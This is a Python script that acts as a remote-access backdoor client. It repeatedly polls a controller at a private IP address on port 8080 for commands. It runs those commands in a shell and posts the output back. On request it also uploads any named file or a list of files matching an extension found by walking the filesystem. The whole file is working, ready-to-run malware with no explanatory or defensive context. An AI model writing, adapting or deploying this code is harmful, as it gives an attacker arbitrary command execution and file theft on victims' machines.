import requests
import subprocess
import time
import os 

while True:
    req = requests.get("http://192.168.42.112:8080")
    command = req.text
    if 'terminate' in command:
        break
    elif 'grab' in command:
        grab,path = command.split("*")
        if os.path.exists(path):
            url = "http://192.168.42.112:8080/store"
            files = {'file':open(path,'rb')}
            r = requests.post(url,files=files)
        else:
            post_response = requests.post(url="http://192.168.42.112:8080",data="not able to find the file".encode())
    elif 'search' in command:
        command = command[7:]
        path,ext = command.split("*")
        lists = ''
        for dirpath,dirname,files in os.walk(path):
            for file in files:
                if file.endswith(ext):
                    lists = lists + '\n' + os.path.join(dirpath,file)
        requests.post(url="http://192.168.42.112:8080",data=lists)
    else:
        cmd = subprocess.Popen(command,shell=True,stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
        post_response = requests.post(url="http://192.168.42.112:8080",data=cmd.stdout.read())
        post_response = requests.post(url="http://192.168.42.112:8080",data=cmd.stderr.read())
    time.sleep(3)
